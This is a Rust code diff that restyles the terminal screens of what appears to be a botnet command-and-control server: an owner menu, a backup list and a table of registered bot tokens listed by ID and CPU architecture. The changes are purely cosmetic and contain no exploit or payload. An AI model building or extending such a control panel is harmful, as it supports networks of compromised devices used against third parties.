@@ -10,59 +10,21 @@ use super::general::show_prompt;
 
 pub async fn handle_owner_command(client: &Arc<Client>, state: &Arc<AppState>) -> Result<()> {
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    let width = get_terminal_width(state).await;
-    let side_width = 30;
-    let main_width = width - side_width - 2;
-    let left_col_width = 37;
-    let right_col_width = main_width - left_col_width - 2;
-
-    // Top border
-    client.write(format!("\x1b[38;5;240m╭{}╦{}╮\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
     
-    // Title with gradient
     let title = apply_ice_gradient("Owner Menu");
-    let title_text = format!("§ {} §", title);
-    let title_padding = main_width - visible_len("§ Owner Menu §") - 2;
-    let left_pad = title_padding / 2;
-    let right_pad = title_padding - left_pad;
-    client.write(format!("\x1b[38;5;240m║{}{}{}║ ●━━━━●━━━━●━━━●━━━●━━━●━━━━● ║\n\r",
-        " ".repeat(left_pad), title_text, " ".repeat(right_pad)).as_bytes()).await?;
+    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
+    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
     
-    // Headers
-    client.write(format!("\x1b[38;5;240m╠{}╦{}╢  │    │    │    │    │    │  ║\n\r", "═".repeat(left_col_width), "═".repeat(right_col_width)).as_bytes()).await?;
-    let left_hdr = apply_ice_gradient("Owner Commands");
-    let right_hdr = apply_ice_gradient("System Management");
+    // Owner Commands
+    let owner_title = apply_ice_gradient("Owner Commands");
+    client.write(format!("  {}\n\r", owner_title).as_bytes()).await?;
     
-    let left_hdr_pad = left_col_width - visible_len("Owner Commands");
-    let right_hdr_pad = right_col_width - visible_len("System Management");
-    
-    client.write(format!("\x1b[38;5;240m║{}{}{}║{}{}{}║░░▒▒▓▓████▓▓▒▒░░▒▒▓▓████▓▓▒▒░░║\n\r", 
-        " ".repeat(left_hdr_pad / 2), left_hdr, " ".repeat(left_hdr_pad - left_hdr_pad / 2),
-        " ".repeat(right_hdr_pad / 2), right_hdr, " ".repeat(right_hdr_pad - right_hdr_pad / 2)
-    ).as_bytes()).await?;
-    
-    client.write(format!("\x1b[38;5;240m╠{}╬{}╬{}╣\n\r", "═".repeat(left_col_width), "═".repeat(right_col_width), "═".repeat(side_width)).as_bytes()).await?;
-    
-    // Render owner commands with panel
-    for (i, item) in OWNER_COMMANDS.iter().enumerate() {
-        let panel = if i < OWNER_PANEL.len() { format!(" {} ║", OWNER_PANEL[i]) } else { "                              ║".to_string() };
-        
-        let cmd_gradient = apply_gradient(item.cmd, 45, 51);
-        let visible_cmd = visible_len(item.cmd);
-        let padding_cmd = if 34 > visible_cmd { 34 - visible_cmd } else { 0 };
-        let cmd_field = format!("{}{}", cmd_gradient, " ".repeat(padding_cmd));
-        
-        let desc_width = right_col_width - 1;
-        let desc_gradient = apply_gradient(item.desc, 51, 87);
-        let visible_desc = visible_len(item.desc);
-        let padding_desc = desc_width.saturating_sub(visible_desc);
-        let desc_field = format!("{}{}", desc_gradient, " ".repeat(padding_desc));
-        
-        client.write(format!("\x1b[38;5;240m║   {}║ {}║{}\n\r", cmd_field, desc_field, panel).as_bytes()).await?;
+    for item in OWNER_COMMANDS.iter() {
+        let cmd_gradient = apply_gradient(item.cmd, 39, 51);
+        client.write(format!("  \x1b[38;5;245m{:<15} : \x1b[0m{}\n\r", cmd_gradient, item.desc).as_bytes()).await?;
     }
     
-    // Footer
-    client.write(format!("\x1b[38;5;240m╰{}╩{}╯\r\n\r", "═".repeat(main_width - 1), "═".repeat(side_width)).as_bytes()).await?;
+    client.write(b"\n\r").await?;
     
     client.set_breadcrumb("Home > Owner Menu").await;
     show_prompt(client, state).await?;
@@ -126,11 +88,20 @@ pub async fn handle_listbackups_command(client: &Arc<Client>) -> Result<()> {
     backups.sort();
     
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    client.write(b"\x1b[38;5;51m=== Available Backups ===\x1b[0m\n\r").await?;
     
-    for backup in backups {
-        client.write(format!("  {}\n\r", backup).as_bytes()).await?;
+    let title = apply_ice_gradient("Available Backups");
+    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
+    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
+    
+    if backups.is_empty() {
+        client.write(b"  \x1b[38;5;245mNo backups found\x1b[0m\n\r").await?;
+    } else {
+        for backup in backups {
+            let backup_gradient = apply_gradient(&backup, 39, 51);
+            client.write(format!("  \x1b[38;5;245m- \x1b[0m{}\n\r", backup_gradient).as_bytes()).await?;
+        }
     }
+    client.write(b"\n\r").await?;
     
     Ok(())
 }
@@ -527,19 +498,27 @@ pub async fn handle_tokens_command(client: &Arc<Client>, state: &Arc<AppState>) 
     let tokens = state.bot_manager.list_tokens().await;
     
     client.write(b"\x1b[2J\x1b[3J\x1b[H").await?;
-    client.write(b"\x1b[38;5;51m=== Registered Bot Tokens ===\x1b[0m\n\r").await?;
-    client.write(format!("{:<38} | {:<10} | {:<20} | {:<20}\n\r", "Bot ID", "Arch", "Created", "Last Used").as_bytes()).await?;
-    client.write(b"---------------------------------------+------------+----------------------+----------------------\n\r").await?;
     
-    for token in tokens {
-        let last_used = token.last_used.map(|t| t.format("%Y-%m-%d %H:%M:%S").to_string()).unwrap_or_else(|| "Never".to_string());
-        client.write(format!("{:<38} | {:<10} | {:<20} | {:<20}\n\r", 
-            token.bot_id, 
-            token.arch, 
-            token.created_at.format("%Y-%m-%d %H:%M:%S"), 
-            last_used
-        ).as_bytes()).await?;
+    let title = apply_ice_gradient("Registered Bot Tokens");
+    client.write(format!("\n\r  {}\n\r", title).as_bytes()).await?;
+    client.write(b"  \x1b[38;5;240m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\x1b[0m\n\r").await?;
+    
+    if tokens.is_empty() {
+        client.write(b"  \x1b[38;5;245mNo tokens found\x1b[0m\n\r").await?;
+    } else {
+        for token in tokens {
+            let last_used = token.last_used.map(|t| t.format("%Y-%m-%d %H:%M").to_string()).unwrap_or_else(|| "Never".to_string());
+            
+            let id_gradient = apply_gradient(&token.bot_id.to_string(), 39, 45);
+            let arch_gradient = apply_gradient(&token.arch, 45, 51);
+            let created_gradient = apply_gradient(&token.created_at.format("%Y-%m-%d").to_string(), 51, 57);
+            let last_gradient = apply_gradient(&last_used, 57, 87);
+            
+            client.write(format!("  {} | {} | {} | {}\n\r", 
+                id_gradient, arch_gradient, created_gradient, last_gradient).as_bytes()).await?;
+        }
     }
+    client.write(b"\n\r").await?;
     
     Ok(())
 }
